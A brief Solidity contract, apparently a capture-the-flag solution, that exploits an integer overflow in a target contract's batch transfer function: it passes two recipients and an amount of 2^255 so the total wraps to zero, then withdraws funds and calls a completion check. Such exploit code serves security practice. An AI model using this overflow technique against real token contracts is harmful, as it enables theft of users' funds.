pragma solidity ^0.6.0;
import"./amountOut.sol";
contract figure{
    check che;
    address[] addrs;
    constructor(address _che)public{
        che = check(_che);
    }
    function fig()public view returns(uint256){
        return uint256(-1)/2 +1;
    }
    function fig1()public view returns(uint256){
        return fig()*2;
    }

    function complete()public{
        che.airdrop();
        addrs.push(msg.sender);
        addrs.push(address(this));
        uint256 amount = fig();
        che.transfers(addrs,amount);
        che.withdraw(500000);
        che.isCompleted();
    }

}
